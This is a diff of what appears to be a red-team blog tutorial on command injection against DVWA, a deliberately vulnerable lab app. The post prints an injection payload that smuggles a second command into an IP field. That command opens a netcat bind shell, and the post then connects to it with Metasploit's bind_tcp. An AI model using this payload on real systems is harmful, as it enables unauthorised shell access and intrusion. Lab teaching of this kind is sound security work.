@@ -7,7 +7,7 @@ tags: [ 'redteam', 'kali', 'dvwa' ]
 ---
 Command Injection is the manipulation of a vulnerable software in order to execute arbitrary commands on the host operating system.
 Command Injections are possible when the vulnerable application skips the input validation before executing a shell command on the host operating system.
-We'll get our hands on DVWA's Command Injection section, and then we'll spawn a backdoor on the host, using [Metasploit](https://www.metasploit.com/).
+We'll get our hands on DVWA's Command Injection section, and then we'll open a backdoor on the host, using [Metasploit](https://www.metasploit.com/).
 
 Visit the *Command Injection* section of DVWA.
 
@@ -23,7 +23,7 @@ Now, let's try to append a list bash command after our input IP address:
 
 Sweet, DVWA simply appends our input in the underlying bash command!
 
-Now, let's listen on port 4444 and redirect all the incoming bytes to a bash shell:
+Now, let's listen on port *4444* and redirect all the incoming bytes to a bash shell:
 
 <pre><code data-trim class="bash">
 127.0.0.1; mkfifo /tmp/pipe ; sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe
@@ -31,9 +31,9 @@ Now, let's listen on port 4444 and redirect all the incoming bytes to a bash she
 
 ![ci-3](/img/posts/ci/ci-3.png)
 
-As you noticed the page is loading forever, so our backdoor is open and waiting for us :smile:
+As you noticed the page is loading forever, so our backdoor is open and waiting for us... :smile:
 
-Let's start metasploit and open the shell on the server:
+Let's start msfconsole and open the shell on the server:
 
 <pre><code data-trim class="bash">
 ⁠⁠⁠msfconsole
@@ -44,9 +44,9 @@ set RHOST 127.0.0.1
 
 ![ci-4](/img/posts/ci/ci-4.png)
 
-Note that we didn't set the LPORT of bind_tcp, since the default one is 4444.
+Note that we didn't set the LPORT of bind_tcp, since the default one is *4444*.
 
-As you notice we are the *www-data* user, and that's why we can't read the /etc/shadow file, why contains the user passwords of the operatinf system.
-But, we have all the privileges that *www-data* user has, and that's enough for defacing DVWA, or exploiting a local privilege escalation vulnerability on the server, in order to get root priviledges.
+As you notice we are the *www-data* user, and that's why we can't read the /etc/shadow file, which contains the user passwords of the operating system.
+But, we have all the privileges that *www-data* user has, and that's enough for e.g. modifying DVWA, or exploiting a local privilege escalation vulnerability on the server, in order to get root privileges.
 
-Happy TCP binding!
+Happy binding!
